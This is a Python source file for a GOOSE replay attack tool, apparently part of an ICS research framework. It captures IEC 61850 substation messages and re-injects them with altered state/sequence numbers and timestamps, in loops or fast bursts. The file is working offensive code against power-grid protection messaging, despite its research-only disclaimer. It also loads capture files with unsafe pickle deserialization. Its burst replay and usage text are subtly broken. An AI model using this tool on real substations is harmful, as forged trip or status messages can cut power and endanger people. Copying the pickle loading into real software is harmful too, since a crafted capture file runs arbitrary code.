"""
GOOSE Replay Attack Tool
=========================

Captures legitimate GOOSE frames from the network and replays them
with original or modified timing. Supports stNum/sqNum manipulation
and timestamp updating for replay attack research.

Platform: Linux only (requires CAP_NET_RAW or root)
Reference: IEC 61850-8-1, MITRE ATT&CK for ICS T0855

⚠️  For authorized security research on isolated test networks only.
"""

from __future__ import annotations

import pickle
import struct
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from gridpulse.protocols.goose import GOOSEFrame
from gridpulse.attacks.goose_inject import GOOSEInjector, GOOSEListener, InjectionStats


# ============================================================================
# Captured Frame Storage
# ============================================================================

@dataclass
class CapturedFrame:
    """A captured GOOSE frame with metadata."""
    raw_bytes: bytes
    timestamp: float           # Capture time (monotonic)
    wall_clock: float          # Capture time (wall clock, epoch)
    frame_index: int           # Sequential index in capture
    parsed: Optional[GOOSEFrame] = None

    def __post_init__(self):
        if self.parsed is None:
            try:
                self.parsed = GOOSEFrame.parse(self.raw_bytes)
            except Exception:
                pass


@dataclass
class CaptureSession:
    """A collection of captured GOOSE frames."""
    interface: str
    start_time: float          # Session start (wall clock)
    frames: list[CapturedFrame] = field(default_factory=list)
    duration: float = 0.0

    @property
    def frame_count(self) -> int:
        return len(self.frames)

    @property
    def avg_rate(self) -> float:
        """Average capture rate in frames/sec."""
        return self.frame_count / self.duration if self.duration > 0 else 0

    def save(self, path: str | Path) -> None:
        """Save capture session to file."""
        path = Path(path)
        with open(path, "wb") as f:
            pickle.dump(self, f, protocol=pickle.HIGHEST_PROTOCOL)

    @classmethod
    def load(cls, path: str | Path) -> 'CaptureSession':
        """Load capture session from file."""
        path = Path(path)
        with open(path, "rb") as f:
            session = pickle.load(f)
        if not isinstance(session, cls):
            raise ValueError(f"Invalid capture file: expected CaptureSession, got {type(session)}")
        return session

    def __str__(self) -> str:
        return (
            f"CaptureSession(interface={self.interface}, "
            f"frames={self.frame_count}, "
            f"duration={self.duration:.2f}s, "
            f"rate={self.avg_rate:.1f} fps)"
        )


# ============================================================================
# GOOSE Capture Engine
# ============================================================================

class GOOSECapture:
    """
    Capture GOOSE frames from the network for later replay.

    Stores raw frame bytes with precise timestamps to enable
    timing-accurate replay.
    """

    def __init__(self, interface: str):
        self._interface = interface
        self._listener: Optional[GOOSEListener] = None

    def capture(
        self,
        duration_seconds: float = 10.0,
        max_frames: Optional[int] = None,
        callback=None,
    ) -> CaptureSession:
        """
        Capture GOOSE frames for a specified duration.

        Args:
            duration_seconds: How long to capture (seconds)
            max_frames: Stop after this many frames (None = unlimited)
            callback: Optional callback(CapturedFrame) for each frame

        Returns:
            CaptureSession with all captured frames
        """
        session = CaptureSession(
            interface=self._interface,
            start_time=time.time(),
        )

        self._listener = GOOSEListener(self._interface)
        start_mono = time.monotonic()

        try:
            frame_idx = 0
            while True:
                elapsed = time.monotonic() - start_mono
                if elapsed >= duration_seconds:
                    break
                if max_frames and frame_idx >= max_frames:
                    break

                remaining = duration_seconds - elapsed
                raw = self._listener.recv_frame(timeout=min(remaining, 1.0))
                if raw is None:
                    continue

                captured = CapturedFrame(
                    raw_bytes=raw,
                    timestamp=time.monotonic(),
                    wall_clock=time.time(),
                    frame_index=frame_idx,
                )
                session.frames.append(captured)
                frame_idx += 1

                if callback:
                    callback(captured)

        finally:
            session.duration = time.monotonic() - start_mono
            self._listener.close()

        return session


# ============================================================================
# GOOSE Replay Engine
# ============================================================================

class GOOSEReplay:
    """
    Replay captured GOOSE frames with configurable timing.

    Supports:
    - Original timing (preserves inter-frame delays)
    - Speed-adjusted replay (faster or slower)
    - stNum/sqNum modification during replay
    - Timestamp updating to current time
    """

    def __init__(self, interface: str):
        self._interface = interface
        self._injector: Optional[GOOSEInjector] = None

    def replay(
        self,
        session: CaptureSession,
        speed_factor: float = 1.0,
        update_timestamps: bool = False,
        st_num_offset: int = 0,
        sq_num_offset: int = 0,
        loop_count: int = 1,
    ) -> InjectionStats:
        """
        Replay captured GOOSE frames.

        Args:
            session: CaptureSession to replay
            speed_factor: Timing multiplier (2.0 = twice as fast, 0.5 = half speed)
            update_timestamps: Update frame timestamps to current time
            st_num_offset: Add this offset to stNum values
            sq_num_offset: Add this offset to sqNum values
            loop_count: Number of times to replay the entire capture

        Returns:
            InjectionStats for the replay
        """
        if not session.frames:
            raise ValueError("No frames to replay")

        self._injector = GOOSEInjector(self._interface)
        stats = InjectionStats(start_time=time.monotonic())

        try:
            for loop in range(loop_count):
                prev_timestamp = session.frames[0].timestamp

                for i, captured in enumerate(session.frames):
                    # Calculate inter-frame delay
                    if i > 0:
                        delay = (captured.timestamp - prev_timestamp) / speed_factor
                        if delay > 0:
                            time.sleep(delay)
                    prev_timestamp = captured.timestamp

                    # Optionally modify frame
                    frame_bytes = captured.raw_bytes
                    if update_timestamps or st_num_offset or sq_num_offset:
                        frame_bytes = self._modify_frame(
                            frame_bytes,
                            update_timestamps,
                            st_num_offset,
                            sq_num_offset,
                        )

                    # Send
                    try:
                        sent = self._injector.send_frame(frame_bytes)
                        stats.packets_sent += 1
                        stats.bytes_sent += sent
                    except OSError:
                        stats.errors += 1

                    stats.last_send_time = time.monotonic()

        finally:
            self._injector.close()

        return stats

    def _modify_frame(
        self,
        frame_bytes: bytes,
        update_ts: bool,
        st_offset: int,
        sq_offset: int,
    ) -> bytes:
        """
        Modify GOOSE frame fields in-place for replay attacks.

        Parses the frame, modifies stNum/sqNum/timestamp, and rebuilds.
        Falls back to raw byte manipulation if parsing fails.
        """
        try:
            frame = GOOSEFrame.parse(frame_bytes)
            if st_offset and hasattr(frame, 'pdu') and frame.pdu:
                frame.pdu.st_num += st_offset
            if sq_offset and hasattr(frame, 'pdu') and frame.pdu:
                frame.pdu.sq_num += sq_offset
            if update_ts and hasattr(frame, 'pdu') and frame.pdu:
                # Update to current time
                now = time.time()
                frame.pdu.t_seconds = int(now)
                frame.pdu.t_fraction = int((now % 1) * 0xFFFFFF)
            return frame.build()
        except Exception:
            # Fall back to raw bytes if parse fails
            return frame_bytes

    def replay_instant(
        self,
        session: CaptureSession,
        delay_us: float = 0,
    ) -> InjectionStats:
        """
        Replay all frames as fast as possible (no timing preservation).

        Args:
            session: CaptureSession to replay
            delay_us: Fixed inter-frame delay in microseconds

        Returns:
            InjectionStats
        """
        self._injector = GOOSEInjector(self._interface)
        try:
            return self._injector.send_burst(
                session.frames[0].raw_bytes,
                count=len(session.frames),
                delay_us=delay_us,
            )
        finally:
            self._injector.close()


if __name__ == "__main__":
    print("GridPulse GOOSE Replay Attack Tool")
    print("=" * 50)
    print("Capture: GOOSECapture('eth0').capture(duration=30)")
    print("Save:    session.save('capture.gpulse')")
    print("Replay:  GOOSEReplay('eth0').replay(session, speed=2.0)")
